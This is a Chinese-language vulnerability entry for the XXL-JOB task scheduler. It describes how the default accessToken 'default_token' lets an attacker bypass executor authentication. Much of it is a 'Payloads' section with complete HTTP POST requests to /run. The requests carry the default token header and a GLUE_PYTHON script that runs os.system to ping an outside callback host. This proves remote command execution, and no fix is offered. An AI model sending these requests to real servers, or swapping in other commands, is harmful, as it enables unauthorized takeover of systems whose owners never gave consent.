# XXL-JOB 默认 accessToken 身份绕过漏洞

## 漏洞描述
XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。

XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中，如果没有修改默认值，攻击者可绕过认证调用 executor，执行任意命令，从而获取服务器权限。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
从 XXL-JOB v2.3.1 版本开始，在 application.properties 为 accessToken 增加了默认值：

```
xxl.job.accessToken=default_token
```

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112151222555.png)

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112173432704.png)


## Payloads
```
xxl.job.accessToken=default_token
```
```
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 407

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_PYTHON",
  "glueSource": "import os\nos.system('ping 0e6ee0e0f3.ipv6.1433.eu.org.')",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```
```
{"code":500,"msg":"The access token is wrong."}
```
```
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
Content-Length: 407

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_PYTHON",
  "glueSource": "import os\nos.system('ping d02caeb35f.ipv6.1433.eu.org.')",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```
